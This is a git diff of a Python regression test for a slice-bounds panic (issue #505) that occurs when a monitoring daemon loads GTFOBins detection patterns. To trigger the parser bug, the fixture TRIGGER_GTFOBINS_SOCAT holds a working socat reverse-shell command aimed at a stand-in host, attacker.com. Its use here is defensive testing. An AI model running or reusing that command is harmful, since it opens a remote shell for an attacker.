@@ -1,56 +1,67 @@
 """
 Repro for issue #505: panic "slice bounds out of range [:12] with length 11"
-on `coi shell --resume` when [monitoring] enabled = true.
+at session start when [monitoring] enabled = true.
 
-Reported flow (0.9.0): a session created/resumed with monitoring enabled crashes
-the coi binary at session start with a Go slice-bounds panic, right after
-"Starting session..." / "[security] Process/filesystem monitoring started".
-With monitoring disabled it works.
+Root cause: the host monitoring daemon's proc-event watcher loads the GTFOBins
+exec-pattern DB at startup (ProcEventWatcher.Run -> loadExecPatterns), and
+gtfobinsStripPlaceholders() panicked on the standard GTFOBins `socat` entry token
+"tcp-connect:attacker.com:12345" — it computed `lower` once but reassigned `token`
+inside the loop, so after the "attacker.com" match shortened the token to
+"tcp-connect" (len 11), the "attacker" match's stale index (12) overran it
+(token[:12]). The panic fires in a goroutine right after "monitoring started",
+crashing the whole process — exactly the reporter's symptom. It only reproduces
+when the GTFOBins DB is present (e.g. after `coi update-patterns`), which is why
+it depends on the user's setup, not the dummy alone.
 
-This test reproduces the real end-to-end scenario: it enables monitoring in
-trusted-scope config (~/.coi/config.toml), creates an ephemeral dummy session,
-powers it off (saving the session), then `coi shell --resume`. It asserts the
-coi process does NOT panic (no "slice bounds out of range" / "panic:" in output)
-and that the session actually resumes.
-
-NOTE (placeholder): the exact trigger is being pinned down; assertions target the
-panic signature from the issue so this test goes red on the bug and green on the
-fix. Refine the trigger/assertions once the root cause is confirmed.
+This test plants a minimal GTFOBins DB containing the triggering token, points
+`[detection] gtfobins_dir` at it, enables monitoring, and starts a session — the
+same code path runs for both a fresh `coi shell` and `coi shell --resume`
+(patterns load at every session start). It asserts the coi process does not panic.
 """
 
-import subprocess
 import time
 from pathlib import Path
 
-from pexpect import EOF, TIMEOUT
-
 from support.helpers import (
-    calculate_container_name,
-    get_container_list,
-    send_prompt,
     spawn_coi,
     wait_for_container_ready,
-    wait_for_prompt,
-    wait_for_specific_container_deletion,
-    wait_for_text_in_monitor,
-    wait_for_text_on_screen,
-    with_live_screen,
 )
 
 PANIC_MARKERS = ("slice bounds out of range", "panic:", "runtime error:")
 
+# A minimal GTFOBins entry whose reverse-shell code contains the exact token that
+# triggered #505. The loader tokenises the code and feeds each token to
+# gtfobinsStripPlaceholders, so this reproduces the parse-time panic.
+TRIGGER_GTFOBINS_SOCAT = """\
+functions:
+  reverse-shell:
+  - code: |-
+      socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+"""
 
-def _write_monitoring_config():
-    """Enable monitoring in trusted-scope config, mirroring the issue's settings.
 
-    Returns (config_path, restore_fn). [network] mode=open avoids CI false-positive
-    network threats; high file-read thresholds avoid startup-noise HIGH threats.
+def _write_trigger_gtfobins(base):
+    """Create <base>/gtfobins/_gtfobins/socat with the triggering token."""
+    gtfobins_dir = Path(base) / "gtfobins"
+    bin_dir = gtfobins_dir / "_gtfobins"
+    bin_dir.mkdir(parents=True, exist_ok=True)
+    (bin_dir / "socat").write_text(TRIGGER_GTFOBINS_SOCAT)
+    return gtfobins_dir
+
+
+def _write_monitoring_config(gtfobins_dir):
+    """Enable monitoring in trusted-scope config and point detection at the
+    planted GTFOBins DB. Returns a restore() callable.
+
+    [network] mode=open avoids CI false-positive network threats; high file-read
+    thresholds avoid startup-noise HIGH threats; sigma_dir is set to a
+    non-existent path so only the GTFOBins trigger is exercised.
     """
     config_path = Path.home() / ".coi" / "config.toml"
     backup = config_path.read_text() if config_path.exists() else None
     config_path.parent.mkdir(parents=True, exist_ok=True)
     config_path.write_text(
-        """
+        f"""
 [network]
 mode = "open"
 
@@ -64,6 +75,10 @@ file_read_rate_mb_per_sec = 1000
 
 [monitoring.nft]
 enabled = false
+
+[detection]
+gtfobins_dir = "{gtfobins_dir}"
+sigma_dir = "{gtfobins_dir}/does-not-exist"
 """
     )
 
@@ -73,7 +88,7 @@ enabled = false
         elif config_path.exists():
             config_path.unlink()
 
-    return config_path, restore
+    return restore
 
 
 def _raw_output(child):
@@ -86,104 +101,59 @@ def _raw_output(child):
     return ""
 
 
-def _assert_no_panic(output, where):
-    lowered = output.lower()
-    for marker in PANIC_MARKERS:
-        assert marker not in lowered, (
-            f"coi panicked during {where} (issue #505).\n"
-            f"Found marker {marker!r} in output:\n{output}"
-        )
+def test_monitoring_gtfobins_load_does_not_panic(
+    coi_binary, cleanup_containers, workspace_dir, tmp_path
+):
+    """Starting a session with monitoring + a GTFOBins DB must not panic (#505).
 
-
-def test_resume_with_monitoring_does_not_panic(coi_binary, cleanup_containers, workspace_dir):
+    The proc-event watcher loads the DB at session start; the buggy parser
+    crashed the whole coi process in a goroutine. We start a session and watch
+    for the panic signature, which (when present) appears right after
+    "monitoring started".
+    """
     env = {"COI_USE_DUMMY": "1"}
-    _config_path, restore = _write_monitoring_config()
+    gtfobins_dir = _write_trigger_gtfobins(tmp_path)
+    restore = _write_monitoring_config(gtfobins_dir)
 
+    child = None
     try:
-        # === Phase 1: create an ephemeral session with monitoring enabled ===
         child = spawn_coi(coi_binary, ["shell"], cwd=workspace_dir, env=env, timeout=120)
-        wait_for_container_ready(child, timeout=90)
-        wait_for_prompt(child, timeout=120)
 
-        container_name = calculate_container_name(workspace_dir, 1)
-
-        with with_live_screen(child) as monitor:
-            time.sleep(2)
-            send_prompt(child, "remember this message")
-            assert wait_for_text_in_monitor(monitor, "remember this message-BACK", timeout=30), (
-                "Dummy CLI should respond in the initial session"
-            )
-
-        # Exit CLI to bash, then poweroff to save the session.
-        child.send("exit")
-        time.sleep(0.3)
-        child.send("\x0d")
-        time.sleep(3)
-        child.send("sudo poweroff")
-        time.sleep(0.3)
-        child.send("\x0d")
+        # The panic (if present) crashes coi in the monitoring goroutine shortly
+        # after the container is set up. Wait for readiness (best-effort) then
+        # watch the output for a panic marker or process exit.
         try:
-            child.expect(EOF, timeout=60)
-        except TIMEOUT:
+            wait_for_container_ready(child, timeout=90)
+        except Exception:
             pass
 
-        output1 = _raw_output(child)
-        try:
-            child.close(force=False)
-        except Exception:
-            child.close(force=True)
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            out = _raw_output(child).lower()
+            if any(m in out for m in PANIC_MARKERS):
+                break
+            if not child.isalive():
+                break
+            time.sleep(1)
 
-        _assert_no_panic(output1, "initial session with monitoring")
-        assert wait_for_specific_container_deletion(container_name, timeout=60), (
-            f"Container {container_name} should be deleted after poweroff"
-        )
-
-        # === Phase 2: resume — this is where #505 panics ===
-        child2 = spawn_coi(
-            coi_binary, ["shell", "--resume"], cwd=workspace_dir, env=env, timeout=120
-        )
-
-        resumed = False
-        try:
-            wait_for_container_ready(child2, timeout=90)
-            wait_for_text_on_screen(child2, "Resuming session", timeout=30)
-            resumed = True
-        except (TimeoutError, TIMEOUT, EOF):
-            resumed = False
-
-        output2 = _raw_output(child2)
-
-        # Best-effort cleanup before assertions.
-        try:
-            child2.send("exit")
-            time.sleep(0.3)
-            child2.send("\x0d")
-            time.sleep(2)
-            child2.send("sudo poweroff")
-            time.sleep(0.3)
-            child2.send("\x0d")
-            child2.expect(EOF, timeout=60)
-        except (TIMEOUT, EOF, Exception):
-            pass
-        try:
-            child2.close(force=False)
-        except Exception:
-            child2.close(force=True)
-
-        container_name2 = calculate_container_name(workspace_dir, 1)
-        if not wait_for_specific_container_deletion(container_name2, timeout=60):
-            subprocess.run(
-                [coi_binary, "container", "delete", container_name2, "--force"],
-                capture_output=True,
-                timeout=30,
+        output = _raw_output(child)
+        lowered = output.lower()
+        for marker in PANIC_MARKERS:
+            assert marker not in lowered, (
+                f"coi panicked while loading the GTFOBins DB under monitoring (issue #505).\n"
+                f"Found {marker!r} in output:\n{output}"
             )
-        time.sleep(1)
-        assert container_name2 not in get_container_list(), (
-            f"Container {container_name2} should be cleaned up"
-        )
-
-        # The actual repro assertions.
-        _assert_no_panic(output2, "coi shell --resume with monitoring")
-        assert resumed, f"Resume should succeed without crashing. Output:\n{output2}"
     finally:
+        if child is not None:
+            try:
+                child.sendline("exit")
+                time.sleep(0.3)
+                child.sendline("sudo poweroff")
+                time.sleep(1)
+            except Exception:
+                pass
+            try:
+                child.close(force=True)
+            except Exception:
+                pass
         restore()
